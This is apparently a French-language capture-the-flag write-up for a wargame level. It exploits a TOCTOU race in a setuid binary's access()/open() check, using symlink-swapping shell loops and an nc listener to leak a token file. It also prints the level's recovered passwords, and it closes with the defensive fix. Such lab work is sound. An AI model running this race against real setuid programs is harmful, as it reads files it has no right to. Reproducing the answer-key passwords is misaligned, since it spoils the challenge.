LEVEL 10

------------------------------------------------------------------------------------------------------------------------

    find . -user level09 2> /dev/null | grep -v proc
                 flag09
    find . -perm /u=s,g=s 2> /dev/null | grep -v proc
    find . -type f -user flag09 -o -user level09
    find . -maxdepth 1 -name "*string*" -print

* Recherches


    strace ./level10

        write(1, "./level10 file host\n\tsends file "..., 65./level10 file host
            sends file to host if you have access to it
        ) = 65


    strings ./level10

        %s file host                                            ---> utile
        sends file to host if you have access to it
        Connecting to %s:6969 ..                                ---> utile
        Unable to connect to host %s
        .*( )*.
        Unable to write banner to host %s
        Connected!
        Sending file ..
        Damn. Unable to open file
        Unable to read from file: %s
        wrote file!
        You don't have access to %s

    objdump -d level10 | awk -F"\n" -v RS="\n\n" '$1 ~ /<main>/' | grep call

    804870e:	e8 0d fe ff ff       	call   8048520 <printf@plt>
    804871a:	e8 71 fe ff ff       	call   8048590 <exit@plt>
    8048749:	e8 92 fe ff ff       	call   80485e0 <access@plt>        --> Faille --> Access exploit - TOCTOU race (Time of Check to Time of Update)
    8048766:	e8 b5 fd ff ff       	call   8048520 <printf@plt>
    8048773:	e8 b8 fd ff ff       	call   8048530 <fflush@plt>
    804878f:	e8 5c fe ff ff       	call   80485f0 <socket@plt>
    80487cb:	e8 30 fe ff ff       	call   8048600 <inet_addr@plt>
    80487de:	e8 6d fd ff ff       	call   8048550 <htons@plt>
    8048805:	e8 06 fe ff ff       	call   8048610 <connect@plt>
    804881f:	e8 fc fc ff ff       	call   8048520 <printf@plt>
    804882b:	e8 60 fd ff ff       	call   8048590 <exit@plt>
    8048847:	e8 74 fd ff ff       	call   80485c0 <write@plt>          --> Ici que le token peut passer
    8048861:	e8 ba fc ff ff       	call   8048520 <printf@plt>
    804886d:	e8 1e fd ff ff       	call   8048590 <exit@plt>
    804887a:	e8 a1 fc ff ff       	call   8048520 <printf@plt>
    8048887:	e8 a4 fc ff ff       	call   8048530 <fflush@plt>
    804889b:	e8 00 fd ff ff       	call   80485a0 <open@plt>
    80488b2:	e8 a9 fc ff ff       	call   8048560 <puts@plt>
    80488be:	e8 cd fc ff ff       	call   8048590 <exit@plt>
    80488da:	e8 31 fc ff ff       	call   8048510 <read@plt>
    80488ea:	e8 e1 fc ff ff       	call   80485d0 <__errno_location@plt>
    80488f4:	e8 77 fc ff ff       	call   8048570 <strerror@plt>
    8048905:	e8 16 fc ff ff       	call   8048520 <printf@plt>
    8048911:	e8 7a fc ff ff       	call   8048590 <exit@plt>
    804892d:	e8 8e fc ff ff       	call   80485c0 <write@plt>          --> Ici que le token peut passer
    8048939:	e8 22 fc ff ff       	call   8048560 <puts@plt>
    8048950:	e8 cb fb ff ff       	call   8048520 <printf@plt>
    8048965:	e8 d6 fb ff ff       	call   8048540 <__stack_chk_fail@plt>

    1er constat : connect port 6969 de l'hote donné en string (second arg)

    fflush : fflush() is typically used for output stream only. Its purpose is to clear (or flush) the output buffer and move
    the buffered data to console (in case of stdout) or disk (in case of file output stream). Below is its syntax.
    
    
    echo Hello > /tmp/x
    ./level10 /tmp/x 127.0.0.1
        Connecting to 127.0.0.1:6969 .. Unable to connect to host 127.0.0.1
    
    nc -l 6969
    ./level10 /tmp/x 127.0.0.1

        -> Fonctionne, maintenant faut bypass le token
    

    https://stackoverflow.com/questions/7925177/access-security-hole
    La faille d'access peut permettre d'envoyer le token bien qu'on ait pas les droits de lecture
    Surtout que le open est fait bien après le access dont gap de temps en théorie suffisant
    [race condition]

    Extrait du man : 

     The result of access() should not be used to make an actual access control decision,
     since its response, even if correct at the moment it is formed, may be outdated at
     the time you act on it.  access() results should only be used to pre-flight, such as
     when configuring user interface elements or for optimization purposes.  The actual
     access control decision should be made by attempting to execute the relevant system
     call while holding the applicable credentials, and properly handling any resulting
     errors; and this must be done even though access() may have predicted success.

     Additionally, set-user-ID and set-group-ID applications should restore the effective
     user or group ID, and perform actions directly rather than use access() to simulate
     access checks for the real user or group ID.


    On va avoir besoin d'un client qui se connecte en permanence :
    
    1. ln -s ~/token /tmp/x

    2. vi /tmp/connect.sh

        #!/bin/sh
        while [ 1 ]
        do
            ~/level10 /tmp/x 127.0.0.1
        done

        sh /tmp/connect.sh
    
    3. nc -lk 6969
    
    Le problème ici est que la race condition ne "s'ouvre" jamais car access ne fait pas d'erreur à proprement parlé, enfin ses prédictions d'access sont juste disons
    Donc il faut ajouter de quoi "tromper" access

    4. 
       #!/bin/sh
       while [ 1 ]
        do
            rm -rf /tmp/x
            touch /tmp/x
            # Race condition here
            ln -sf ~/token /tmp/x
        done

    su flag10 woupa2yuojeeaaed06riuj63c
    getflag
    su level11 feulo4b72j7edeahuete3no7c


* Solution

------------------------------------------------------------------------------------------------------------------------

NB : 
That is a TOCTOU race (Time of Check to Time of Update). A malicious user could substitute a file he has access to for a symlink to something he doesn't have access to between the access() and the open() calls. Use faccessat() or fstat(). In general, open a file once, and use f*() functions on it (e.g: fchown(), ...).

NB : nc -lk =  Forces nc to stay listening for another connection after its current connection is completed


